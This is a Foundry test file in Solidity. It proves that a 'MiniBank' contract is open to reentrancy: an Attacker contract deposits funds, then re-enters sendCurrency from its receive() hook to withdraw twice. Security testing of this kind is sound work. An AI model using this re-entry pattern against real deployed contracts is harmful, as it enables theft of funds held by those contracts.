
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MiniBank} from "../src/MiniBank.sol";

contract TestReentrancyMiniBank is Test {
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1 gwei); // Ensure enough value for gas and logic
        vm.assume(attackVal < type(uint128).max); // Prevent overflow in test logic setup

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific time dependency or complex state required beyond funding.

        // --- 3. Funding ---
        
        // A. Fund the Victim (so it has ETH to steal)
        // We give the victim significantly more than the attack value to allow for multiple withdrawals.
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal * 2);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = MiniBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds to establish a balance to withdraw
        victim.receiveCurrency{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        uint256 startBalance = address(this).balance;

        // 2. Store the value for the re-entrant call if needed.
        storedVal = val;

        // 3. Call the vulnerable function.
        victim.sendCurrency();

        // 4. Verify Success Conditions.
        uint256 endBalance = address(this).balance;
        
        // If the attack succeeded, we should have withdrawn the 'val' at least twice 
        // (once legitimately, once via reentrancy) before the balance was set to 0.
        // Therefore, our balance increase should be greater than the single 'val'.
        if (endBalance > startBalance + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract
            victim.sendCurrency();
        }
    }
}
